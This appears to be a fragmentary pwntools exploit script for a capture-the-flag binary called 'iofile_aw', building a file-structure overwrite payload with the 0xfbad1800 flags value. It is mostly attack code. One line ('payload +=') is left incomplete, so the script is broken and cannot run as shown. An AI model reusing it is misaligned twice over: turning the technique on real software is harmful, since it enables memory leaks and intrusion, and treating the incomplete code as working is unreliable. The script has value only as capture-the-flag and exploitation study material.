from pwn import *

p = process('iofile_aw')
payload = p64(0xfbad1800)
payload += p64(0)*3
payload +=
p.sendlineafter('# ', 'printf ' + payload)

